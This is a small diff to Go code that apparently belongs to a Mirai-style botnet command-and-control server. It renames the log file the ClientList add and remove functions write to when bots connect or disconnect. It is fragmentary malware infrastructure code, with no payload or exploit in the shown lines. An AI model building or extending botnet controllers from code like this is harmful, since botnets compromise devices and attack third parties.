@@ -56,7 +56,7 @@ func (this *ClientList) AddClient(c *Bot) {
     botCountAdd := this.Count()
     this.addQueue <- c
 
-    file, err := os.OpenFile("cncLog4mirai-1017-imBack.txt",os.O_APPEND|os.O_CREATE|os.O_WRONLY,0644)
+    file, err := os.OpenFile("cncLog4white-1030-t10.txt",os.O_APPEND|os.O_CREATE|os.O_WRONLY,0644)
     if err != nil{
         fmt.Println("Error opening file:",err)
         return
@@ -73,7 +73,7 @@ func (this *ClientList) DelClient(c *Bot) {
     botCountDel := this.Count()
     this.delQueue <- c
 
-    file, err := os.OpenFile("cncLog4mirai-1017-imBack.txt",os.O_APPEND|os.O_CREATE|os.O_WRONLY,0644)
+    file, err := os.OpenFile("cncLog4white-1030-t10.txt",os.O_APPEND|os.O_CREATE|os.O_WRONLY,0644)
     if err != nil{
         fmt.Println("Error opening file:",err)
         return
